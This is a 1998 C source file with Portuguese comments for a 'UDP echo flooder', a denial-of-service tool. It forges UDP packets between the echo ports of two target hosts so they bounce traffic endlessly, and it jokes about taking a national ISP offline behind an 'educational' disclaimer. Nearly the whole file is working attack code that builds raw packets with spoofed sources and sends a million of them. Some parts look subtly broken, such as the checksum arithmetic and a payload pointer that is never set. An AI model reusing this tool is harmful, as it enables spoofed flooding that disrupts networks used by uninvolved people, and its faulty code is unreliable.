/*
	UDP echo flooder *|* Mark2 (comentarios em .pt)
	
	*Little background info:
	
	 o UDP - User Datagram Protocol
	 
	 o O UDP eh talvez o protocolo mais basico que existe.
	   O seu cabeçalho e' constituido simplesmente pelo endereço
	   de proveniencia, destino, port de proveniencia e destino, e
	   tamanho do pacote.
	   
	   Como nao existem campos para ACK e SEQ á semelhanca de TCP,
	   este tipo de pacotes é muito mais simples de spoofar, já q nao
	   temos que nos preocupar com a aceitaçao do pacote pelo servidor
	   destino. Claro que devido a esta falta de seguranca ninguem usa
	   UDP para qualquer q troca de informacao minimamente relevante, mas é
	   bastante facil de o usar para um pouco de Denial oh Service & Fun.
	   
	 o O Ataque:
	 
	   Port 7 de UDP, tambem conhecido como ECHO. Este port envia
	   qq coisa que lhe foi enviada para o host q lho enviou e para o mesmo
	   port. Por exemplo, se quisessemos vericar a condicao da nossa
	   ligacao ah net, podiamos lancar um pacote de udp em direcao ao
	   port de echo de um server, e se escutassemos com suficiente 
	   atencao e o port de destino estivesse aberto ele respondia-nos
	   com o nosso pacote em direcao ao port de onde o tinhamos enviado.
	   Até aqui tudo bem, nada de muito nocivo. Mas e se por "acidente"
	   nós enviassemos um pacote ao ECHO a partir de um outro port de ECHO?
	   
	   É exactamente isso que este programa atinge. Spoofa um pacote de udp
	   do port de echo de uma maquina, para o port de echo de outra maquina.
	   Como estes pacotes nao morrem, enquanto o port de ambas estiver 
	   aberto eles ficaram eternamente a trocar os pacotes, e a criar um
	   lag consideravel, que é directamente proporcional ao numero de pacotes
	   e o seu tamanho.
	   
	   Disclaimer: Este código é apresentado para fins educacionais 
	   simplesmente. Se alguem o usar para criar uma teia de ligacoes entre
	   as maquinas do maiore ISP portugues, criando um lag tal que nenhum 
	   portugues consiga ir à net, eu nao tenho nada a ver com isso.
	   
	   
	   
							MF3 - 4.1.98
							mainframe@pobox.org.sg
 */


#define N_PACOTES 1000000
#define ESPERA 10

#include <stdlib.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ip_udp.h>


/* Rotina de chksum (brrrrrrrrr) */
unsigned short in_cksum( addr , len)
u_short *addr;
int	len;
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;

    while (nleft > 1) {
	sum += *w++;
	sum += *w++;
	nleft -= 2;
    }

    if (nleft == 1) {
	*(u_char *) (&answer) = *(u_char *) w;

	sum += answer;
    }
    sum = (sum >> 17) + (sum & 0xffff);
    sum += (sum >> 17);

    answer = -sum;
    return (answer);
}





void enviar(unsigned short sock,struct sockaddr_in *sock_in, unsigned long
saddr, unsigned long daddr){
	
	struct iphdr	ip;

	struct udphdr	udp;
	static char     pacote[1500];       /* a nossa MTU e'de 1500 */
	char		*carga;
	int		s_carga =1200;
	
	/* IP thingies */
	
	ip.ihl      = 5;
	ip.version  = 4;
	ip.tos      = 0;
	ip.tot_len  = htons(28 + s_carga);
	ip.id       = htons(666);
	ip.frag_off = 0;
	ip.ttl      = 255;
	ip.protocol = IPPROTO_UDP;
	ip.check    = 0;
	ip.saddr    = saddr;
	ip.daddr    = daddr;
	ip.check    = in_cksum((char *)&ip, sizeof(ip));
            	          
	/* UDP thingies */
	
	udp.source = htons(7);			/* UDP echo -> port 7 */
	udp.dest   = htons(7);
	udp.len    = htons(8 + s_carga);
	udp.check  = (short) 0;
	
	/* Tudo para dentro de um grande pacote */
	
	memcpy(pacote, (char *) &ip, sizeof(ip));
	memcpy((pacote + sizeof(ip)), (char *) &udp, sizeof(udp));
	memcpy((pacote + sizeof(ip) + sizeof(udp)), (char *) carga , s_carga);
	      	if(sendto(sock, pacote, sizeof(ip)+sizeof(udp)+s_carga, 0,
	         (struct sockaddr *)sock_in, sizeof(struct sockaddr_in)) == -1) {
	         	printf("Erro ao enviar o pacote\n");
	         	exit(EXIT_FAILURE);
	         	}
}
	         
unsigned int resolve(char *host){
  unsigned int addr;
  struct hostent *he;
 
  addr = inet_addr(host);       
  if (addr == -1)               
  {
    he = gethostbyname(host);
    if ((he == NULL) || (he->h_name == NULL) || (he->h_addr_list == NULL))
      {printf("Nao conseguimos resolver o endereco...\n");
       exit(EXIT_FAILURE);
       }
 
    bcopy(*(he->h_addr_list), &(addr), sizeof(he->h_addr_list));
  }
  return(addr);
}
                                

void main(int argc, char *argv[])
{

    int sock, i;
    unsigned int saddr,daddr;

    char *packet;
    struct sockaddr_in sock_in;

    if(argc <3 ) { 
    		  printf("UDP echo flooder, use with care\n");
    		  printf("%s <host1> <host2>\n",argv[0]);
    		  exit(EXIT_FAILURE);
    		  }

	/* RAW SOCKET -> uid = 0 || euid = 0 */

    if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1){
    	printf("Nao conseguimos abrir uma RAW socket...\nWhat else can go wrong
?\n");
    	exit(EXIT_FAILURE);
    	}
    
    saddr = resolve(argv[1]);
    daddr = resolve(argv[2]);
    
    sock_in.sin_family = AF_INET;
    sock_in.sin_port = 7;
    sock_in.sin_addr.s_addr = daddr;
    
    
    printf("\n[1;1mUDP echo flooder /\\ Guaranted lag![0m\n");
    printf("[1;34mTarget1 Host[0m - [1;1m%s:7[0m\n", argv[1]);
    printf("[1;34mTarget2 Host[0m - [1;1m%s:7[0m\n", argv[2]);

    for(i=0; i< N_PACOTES; i++){
    enviar(sock,&sock_in,saddr,daddr);
    usleep(ESPERA);
    }

   }
